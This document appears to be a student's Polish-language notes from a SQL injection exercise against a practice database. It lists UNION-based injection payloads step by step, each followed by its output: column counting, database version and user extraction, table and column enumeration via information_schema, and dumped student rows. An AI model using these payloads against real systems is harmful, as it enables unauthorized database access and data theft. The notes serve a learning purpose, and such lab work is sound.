payload:   100' order by 8;--+
info:  Jest 7 kolumn

payload: 100' union select 1,database(),3,4,5,6,7;--+
info: database() = hcm

analogicznie zmienne po kolei:

version(): 10.1.26-MariaDB-0+deb9u1
user(): newuser@localhost
@@tmpdir: /tmp

SELECT ... FROM id='%s';

payload: 100' union select 1,table_name,3,4,5,6,7 from information_schema.tables;--+
wszystkie bazy:
Imie: studenci
Imie: hackme1
Imie: ALL_PLUGINS
Imie: APPLICABLE_ROLES
Imie: CHARACTER_SETS
Imie: COLLATIONS
Imie: COLLATION_CHARACTER_SET_APPLICABILITY
Imie: COLUMNS
Imie: COLUMN_PRIVILEGES
Imie: ENABLED_ROLES
Imie: ENGINES
Imie: EVENTS
Imie: FILES
Imie: GLOBAL_STATUS
Imie: GLOBAL_VARIABLES
Imie: KEY_CACHES
Imie: KEY_COLUMN_USAGE
Imie: PARAMETERS
Imie: PARTITIONS
Imie: PLUGINS
Imie: PROCESSLIST
Imie: PROFILING
Imie: REFERENTIAL_CONSTRAINTS
Imie: ROUTINES
Imie: SCHEMATA
Imie: SCHEMA_PRIVILEGES
Imie: SESSION_STATUS
Imie: SESSION_VARIABLES
Imie: STATISTICS
Imie: SYSTEM_VARIABLES
Imie: TABLES
Imie: TABLESPACES
Imie: TABLE_CONSTRAINTS
Imie: TABLE_PRIVILEGES
Imie: TRIGGERS
Imie: USER_PRIVILEGES
Imie: VIEWS
Imie: GEOMETRY_COLUMNS
Imie: SPATIAL_REF_SYS
Imie: CLIENT_STATISTICS
Imie: INDEX_STATISTICS
Imie: INNODB_SYS_DATAFILES
Imie: TABLE_STATISTICS
Imie: INNODB_SYS_TABLESTATS
Imie: USER_STATISTICS
Imie: INNODB_SYS_INDEXES
Imie: XTRADB_RSEG
Imie: INNODB_CMP_PER_INDEX
Imie: INNODB_TRX
Imie: CHANGED_PAGE_BITMAPS
Imie: INNODB_FT_BEING_DELETED
Imie: INNODB_LOCK_WAITS
Imie: INNODB_LOCKS
Imie: INNODB_TABLESPACES_ENCRYPTION
Imie: XTRADB_INTERNAL_HASH_TABLES
Imie: INNODB_SYS_FIELDS
Imie: INNODB_CMPMEM_RESET
Imie: INNODB_CMP
Imie: INNODB_FT_INDEX_TABLE
Imie: INNODB_SYS_TABLESPACES
Imie: INNODB_MUTEXES
Imie: INNODB_BUFFER_PAGE_LRU
Imie: INNODB_SYS_FOREIGN_COLS
Imie: INNODB_CMP_RESET
Imie: INNODB_BUFFER_POOL_STATS
Imie: INNODB_FT_INDEX_CACHE
Imie: INNODB_SYS_FOREIGN
Imie: INNODB_METRICS
Imie: INNODB_FT_DEFAULT_STOPWORD
Imie: INNODB_CMPMEM
Imie: INNODB_SYS_TABLES
Imie: INNODB_SYS_COLUMNS
Imie: INNODB_FT_CONFIG
Imie: INNODB_BUFFER_PAGE
Imie: INNODB_CMP_PER_INDEX_RESET
Imie: XTRADB_READ_VIEW
Imie: INNODB_SYS_SEMAPHORE_WAITS
Imie: INNODB_CHANGED_PAGES
Imie: INNODB_FT_DELETED
Imie: INNODB_TABLESPACES_SCRUBBING

Kolumny tabeli z której są dane: 100' union select 1,column_name,3,4,5,6,7 from information_schema.columns;--+

Imie: id
Imie: fname
Imie: lname
Imie: email
Imie: inne
Imie: inne1
Imie: inne2

Nazwa tabeli: studenci

Dane z tabeli:

Imie: KowalskiJan, 1
Imie: KowalJan, 10
